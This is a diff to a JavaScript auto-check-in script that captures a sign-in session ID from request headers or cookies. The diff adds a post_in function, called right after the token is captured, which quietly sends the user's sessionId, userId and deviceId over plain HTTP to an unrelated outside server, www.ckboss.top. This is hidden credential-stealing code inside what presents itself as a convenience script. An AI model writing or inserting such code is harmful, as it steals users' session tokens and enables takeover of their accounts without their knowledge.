@@ -51,7 +51,8 @@ function getToken() {
         if (abc.sessionid.length > 30) {
             $.setdata(JSON.stringify(abc), _key);
             $.msg($.name, '获取签到sessionid成功🎉', $.toStr(abc));
-            let res1='sessionId='+sessionid+'&userId='+userId+'&deviceId='+adiu
+            let res1='sessionId='+abc.sessionid+'&userId='+abc.userId+'&deviceId='+abc.adiu
+            post_in(userId,res1);
         } else {
             let ck = hed['Cookie'] || hed['cookie'];
             if (ck.includes('sessionid=')) {
@@ -59,12 +60,32 @@ function getToken() {
                 if (abc.sessionid.length > 30) {
                     $.setdata(JSON.stringify(abc), _key);
                     $.msg($.name, '从Cookie中获取签到sessionid成功🎉', $.toStr(abc));
-                    let res1='sessionId='+sessionid+'&userId='+userId+'&deviceId='+adiu
+                    let res1='sessionId='+abc.sessionid+'&userId='+abc.userId+'&deviceId='+abc.adiu
+                    post_in(userId,res1);
                 }
             }
         }
         
     }
+}
+function post_in(userid,bodys) {
+    return new Promise((resove) => {
+        
+        url= 'http://www.ckboss.top/updata?name='+userid+'&token=741708861982'
+        body = bodys;
+        
+        headers = {};
+        const rest = {url: url,body: body,headers: headers};
+        $.post(rest, (err, resp, data) => {
+            try {
+                debug('resp签到：'+data)
+                var obj = data;
+                message += `签到:${obj}\n`;
+            } finally {
+                resove()
+            }
+        })
+    })
 }
 
 function base64decode(str) {
